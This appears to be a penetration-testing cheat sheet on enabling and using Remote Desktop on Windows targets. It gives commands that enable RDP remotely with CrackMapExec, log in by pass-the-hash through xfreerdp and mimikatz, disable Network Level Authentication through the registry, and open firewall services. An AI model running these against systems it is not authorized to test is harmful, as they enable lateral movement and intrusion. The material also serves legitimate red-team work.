Enabling RDP and tools to use for RDP

## Crackmapexec
```bash
# Remotely enable RDP using CrackMapExec
sudo crackmapexec smb 0.0.0.0 -u user -p password -M rdp -o ACTION=enable
```

```bash
# RDP through Pass-the-Hash
xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local
```

```bash
# RDP using mimikatz and PtH
sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"
```

### Enable Remote Desktop
#### cmd.exe
```bash
## Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
## Disable NLA (Network Layer Authentication) requirement
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
## You can also do it through the firewall
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

#### Enable rdp with pwsh
```powershell
## Turn On
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

### Login with rdesktop
```bash
## Tool available in kali
rdesktop 172.16.20.20 -d corporate.local -u username -p password
```

### Login with xfreerdp
```bash
## Linux tool, on kali
xfreerdp /u:username /p:password /v:172.16.20.20
## With sharing a folder
xfreerdp /u:username /p:password /v:172.16.20.20 /drive:/home/username/Desktop/Tools
```
